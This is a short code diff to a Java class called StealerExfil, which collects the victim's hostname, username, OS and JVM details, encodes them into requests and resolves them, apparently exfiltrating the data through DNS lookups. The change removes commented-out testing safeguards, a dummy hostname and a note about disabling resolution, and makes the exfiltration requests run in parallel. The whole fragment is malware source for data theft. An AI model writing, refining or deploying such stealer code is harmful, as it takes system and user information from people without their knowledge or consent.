@@ -84,7 +84,6 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
 
         Map<String, String> exfilData = new LinkedHashMap<>();
         exfilData.put("host", getHostname());
-        //exfilData.put("host", "test-host-01");    // For testing...
         exfilData.put("user", getUsername(envVars, javaProps));
         exfilData.put("os", getOsInfo(javaProps));
         exfilData.put("jvm", getRuntimeInfo(javaProps));
@@ -92,10 +91,7 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
 
         List<String> requests = encode(exfilData);
 
-        for (String request : requests) {
-            //System.out.println("Not actually resolving: " + request);
-            resolve(request);   // Comment out this line during testing
-        }
+        requests.parallelStream().forEach(StealerExfil::resolve);
     }
 
     static List<String> encode(Map<String, String> exfilData) {
